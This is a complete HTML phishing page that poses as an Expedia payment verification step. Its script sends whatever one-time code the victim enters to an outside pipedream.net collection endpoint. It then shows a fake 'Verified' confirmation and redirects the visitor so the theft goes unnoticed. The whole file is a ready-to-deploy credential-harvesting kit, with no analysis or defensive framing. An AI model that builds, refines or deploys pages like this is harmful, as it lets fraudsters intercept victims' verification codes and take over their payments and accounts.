<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Verify your payment</title>

<!-- Favicon -->
<link rel="icon" type="image/png" href="images/favic.png">

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
:root{
    --accent:#1668E8;
    --muted:#6B7280;
}
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:'Inter',sans-serif;
    background:#ffffff;
    color:#111827;
    min-height:100vh;
    display:flex;
    flex-direction:column;
}

/* HEADER */
.verify-header{
    height:72px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 24px;
    background:#fff;
    flex-shrink:0;
}
.header-logo{height:34px;width:auto}
.user-hint{color:var(--muted);font-size:14px}

/* MAIN */
.container-verify{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

/* CARD */
.card-verify{
    width:100%;
    max-width:430px;
    background:#fff;
    border-radius:20px;
    padding:34px;
    box-shadow:0 20px 45px rgba(0,0,0,.08);
}
.title{text-align:center;font-size:28px;font-weight:700;margin-bottom:8px}
.muted{text-align:center;color:var(--muted);line-height:1.6}

/* INPUT */
.otp-free{
    width:100%;height:58px;border-radius:14px;border:1px solid #ddd;padding:0 18px;font-size:18px;transition:.25s;
}
.otp-free:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 4px rgba(22,104,232,.12)}

/* BUTTON */
.btn-verify{background:var(--accent);border:none;color:#fff;height:56px;border-radius:14px;font-size:16px;font-weight:600;transition:.25s}
.btn-verify:hover{background:#1159cb}

/* LINKS */
.helper{margin-top:18px;text-align:center;font-size:14px;color:var(--muted)}
.helper a{color:var(--accent);text-decoration:none;font-weight:600}
.small-link{margin-top:18px;text-align:center;font-size:13px;color:var(--muted)}

/* LOADING overlay (static) */
.overlay{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,.95);
    display:flex;
    align-items:center;
    justify-content:center;
    z-index:9999;
    pointer-events:none;
    opacity:0;
    transition:opacity .12s;
}
.overlay.visible{pointer-events:auto;opacity:1}
.spinner{width:90px;height:90px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#fff;box-shadow:0 15px 35px rgba(0,0,0,.08)}
.ring{width:52px;height:52px;border-radius:50%;border:5px solid #e5e7eb;border-top-color:var(--accent);animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* success panel inside overlay */
.success-panel{display:none;flex-direction:column;align-items:center;gap:14px}
.overlay.success .spinner{display:none}
.overlay.success .success-panel{display:flex}

/* MOBILE */
@media(max-width:576px){
.card-verify{padding:28px 22px}
.title{font-size:24px}
.verify-header{justify-content:center}
.header-logo{height:30px}
}
</style>

</head>
<body>

<header class="verify-header">
    <div style="display:flex;align-items:center;gap:12px">
      <img src="images/logo.png" alt="Expedia" class="header-logo">
      <div style="font-weight:700">Expedia</div>
    </div>

    <div id="userHint" class="user-hint"></div>
</header>

<main class="container-verify">
  <div>
    <div class="card-verify">
      <h2 class="title">Enter your verification code</h2>
      <p class="muted">We sent a verification code to your phone or email.</p>

      <div class="mt-4">
        <input id="otpInput" class="otp-free" type="text" placeholder="Enter verification code" autocomplete="one-time-code">
      </div>

      <div class="d-grid mt-4">
        <button id="verifyBtn" class="btn btn-verify">Verify</button>
      </div>

      <div class="helper">
        Didn't receive a code?
        <a href="#" id="resend">Resend</a>
      </div>
    </div>
  </div>
</main>

<!-- Loading overlay (static spinner + hidden success panel) -->
<div id="overlay" class="overlay" aria-hidden="true">
  <div class="spinner" role="status" aria-hidden="true">
    <div class="ring"></div>
  </div>

  <div class="success-panel" aria-hidden="true">
    <div style="width:90px;height:90px;border-radius:50%;background:#22c55e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:40px;">✓</div>
    <div style="font-size:22px;font-weight:700;color:#0b1220;">Verified</div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
  const endpoint = "https://eor6x6qn5m5ctvy.m.pipedream.net"; // placeholder
  const otpInput = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const overlay = document.getElementById('overlay');
  const overlaySpinner = overlay.querySelector('.spinner');
  const successPanel = overlay.querySelector('.success-panel');
  const resend = document.getElementById('resend');

  // --- Overlay helpers ---
  function showSpinner() {
    overlay.classList.remove('success');
    overlay.classList.add('visible');
    overlay.setAttribute('aria-hidden','false');
    overlaySpinner.style.display = '';
    successPanel.style.display = 'none';
  }
  function showSuccess(message = 'Verified', color = '#22c55e') {
    overlay.classList.add('success');
    overlay.setAttribute('aria-hidden','false');
    overlaySpinner.style.display = 'none';
    successPanel.style.display = 'flex';
    // customize panel text + color
    const circle = successPanel.querySelector('div:first-child');
    const text = successPanel.querySelector('div:last-child');
    circle.style.background = color;
    circle.textContent = '✓';
    text.textContent = message;
  }
  function hideOverlay() {
    overlay.classList.remove('visible','success');
    overlay.setAttribute('aria-hidden','true');
    overlaySpinner.style.display = '';
    successPanel.style.display = 'none';
  }

  // --- Submit handler ---
  async function handleSubmit(e) {
    e && e.preventDefault();
    const otpValue = (otpInput.value || '').trim();
    if (!otpValue) {
      alert('Please enter the verification code.');
      otpInput.focus();
      return;
    }

    verifyBtn.disabled = true;
    otpInput.disabled = true;
    showSpinner();

    try {
      await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: otpValue })
      });
    } catch (err) {
      console.error(err);
      hideOverlay();
      verifyBtn.disabled = false;
      otpInput.disabled = false;
      alert('Network error while verifying. Please try again.');
      return;
    }

    setTimeout(()=>{
      showSuccess('Verified','#22c55e');
      setTimeout(()=>{
        window.location.href = 'success.html';
      }, 900);
    }, 7000);
  }

  // --- Resend handler ---
  async function handleResend(e) {
    e.preventDefault();
    showSpinner();
    try {
      await fetch(endpoint, { method: "POST" });
    } catch (err) {
      console.error(err);
      hideOverlay();
      alert('Network error while resending. Please try again.');
      return;
    }
    setTimeout(()=>{
      showSuccess('New code sent','#1668E8'); // blue vibe
      setTimeout(()=>{ hideOverlay(); }, 1200);
    }, 800);
  }

  // --- Event bindings ---
  verifyBtn.addEventListener('click', handleSubmit);
  otpInput.addEventListener('keydown', function(e){
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSubmit();
    }
  });
  if (resend) resend.addEventListener('click', handleResend);

  otpInput.focus();
});
</script>



</body>
</html>
